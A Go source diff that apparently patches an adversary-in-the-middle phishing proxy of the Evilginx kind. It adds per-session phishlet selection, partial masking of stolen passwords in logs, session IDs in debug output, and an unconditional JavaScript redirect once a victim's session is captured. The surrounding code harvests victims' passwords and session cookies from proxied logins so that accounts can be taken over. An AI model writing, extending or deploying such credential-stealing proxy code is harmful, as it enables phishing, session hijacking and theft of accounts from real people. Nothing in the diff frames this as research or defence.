@@ -20,6 +20,7 @@ import (
 	"html"
 	"io"
 	"io/ioutil"
+
 	"net"
 	"net/http"
 	"net/url"
@@ -82,6 +83,8 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	current_session   *Session
+	current_url       *url.URL
 }
 
 type ProxySession struct {
@@ -104,6 +107,46 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 		return nil, err
 	}
 	return newBody, nil
+}
+
+func redactString(s string) string {
+	// for input heslo123 returns h*****3
+	if len(s) < 5 {
+		return s
+	}
+
+	redacted := strings.Repeat("*", len(s)-2)
+	return string(s[0]) + redacted + string(s[len(s)-1])
+}
+
+func (p *HttpProxy) getPhishletBySession() *Phishlet {
+	if p.current_session != nil {
+		pl, err := p.cfg.GetPhishlet(p.current_session.PhishLure.Phishlet)
+		if err == nil {
+			return pl
+		}
+		log.Error("getPhishletBySession: %s", err)
+		return nil
+	}
+	// no session so return phishlet by current URL
+	if p.current_url != nil {
+		for _, pl := range p.cfg.phishlets {
+			for _, domain := range pl.domains {
+				if strings.HasSuffix(p.current_url.Host, domain) {
+					return pl
+				}
+			}
+
+		}
+		log.Error("getPhishletBySession: no session and no phishlet found for current URL: %s", p.current_url.Host)
+	}
+	// its better to return bad phishlet than nil because there are cases where phishlet is not needed but nil would break
+	for _, pl := range p.cfg.phishlets {
+		log.Error("getPhishletBySession: Defaulting to first phishlet: %s", pl.Name)
+		return pl
+	}
+	log.Error("getPhishletBySession: no phishlets configured")
+	return nil
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
@@ -165,7 +208,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
-
+			p.current_url = req.URL
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
 
@@ -470,6 +513,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
+						p.current_session = s
 						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 						if err == nil {
 							// show html redirector if it is set for the current lure
@@ -664,9 +708,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						// patch phishing URLs in JSON body with original domains
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
 						req.ContentLength = int64(len(body))
-
-						log.Debug("POST: %s", req.URL.Path)
-						log.Debug("POST body = %s", body)
+						httpMethod := strings.ToUpper(req.Method)
+						log.Debug("%s: %s - session_id=%s", httpMethod, req.URL.Path, ps.SessionId)
+						if httpMethod == "POST" {
+							log.Debug("body: %s", body)
+						}
 
 						contentType := req.Header.Get("Content-type")
 
@@ -689,6 +735,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if pl.password.tp == "json" {
 								pm := pl.password.search.FindStringSubmatch(string(body))
 								if pm != nil && len(pm) > 1 {
+									pm[1] = redactString(pm[1])
 									p.setSessionPassword(ps.SessionId, pm[1])
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
@@ -752,7 +799,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						} else if form_re.MatchString(contentType) {
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
-								log.Debug("POST: %s", req.URL.Path)
+								log.Debug("%s: %s", req.Method, req.URL.Path)
 
 								for k, v := range req.PostForm {
 									// patch phishing URLs in POST params with original domains
@@ -770,6 +817,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
 										pm := pl.password.search.FindStringSubmatch(v[0])
 										if pm != nil && len(pm) > 1 {
+											pm[1] = redactString(pm[1])
 											p.setSessionPassword(ps.SessionId, pm[1])
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
@@ -800,7 +848,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								for k, v := range req.PostForm {
 									if len(v) > 0 {
-										log.Debug("POST %s = %s", k, v[0])
+										if k == "password" {
+											log.Debug("POST %s = %s - session_id=%s", k, redactString(v[0]), ps.SessionId)
+
+										} else {
+											log.Debug("POST %s = %s - session_id=%s", k, v[0], ps.SessionId)
+										}
 									}
 								}
 
@@ -987,7 +1040,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						s, ok := p.sessions[ps.SessionId]
 						if ok && (s.IsAuthUrl || !s.IsDone) {
 							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
-								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
+								log.Debug("session: %s: %s = %s - session_id=%s", c_domain, ck.Name, ck.Value, ps.SessionId)
 								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
 							}
 						}
@@ -1079,6 +1132,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 			if err == nil {
 				for site, pl := range p.cfg.phishlets {
+					if p.getPhishletBySession() != nil {
+						if pl.Name != p.getPhishletBySession().Name {
+							continue
+						}
+					}
+
 					if p.cfg.IsSiteEnabled(site) {
 						// handle sub_filters
 						sfs, ok := pl.subfilters[req_hostname]
@@ -1226,14 +1285,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				s, ok := p.sessions[ps.SessionId]
 				if ok && s.IsDone {
 					if s.RedirectURL != "" && s.RedirectCount == 0 {
-						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
-							// redirect only if received response content is of `text/html` content type
-							s.RedirectCount += 1
-							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
+						s.RedirectCount += 1
+						log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
 
-							_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
-							return resp
-						}
+						_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
+						return resp
 					}
 				}
 			}
@@ -1704,7 +1760,14 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 		prefix = "."
 		hostname = hostname[1:]
 	}
+	// get phishlet based on the session
+
 	for site, pl := range p.cfg.phishlets {
+		if p.getPhishletBySession() != nil {
+			if pl.Name != p.getPhishletBySession().Name {
+				continue
+			}
+		}
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
 			if !ok {
@@ -1729,7 +1792,14 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 		prefix = "."
 		hostname = hostname[1:]
 	}
+
 	for site, pl := range p.cfg.phishlets {
+		if p.getPhishletBySession() != nil {
+			if pl.Name != p.getPhishletBySession().Name {
+				continue
+			}
+		}
+
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
 			if !ok {
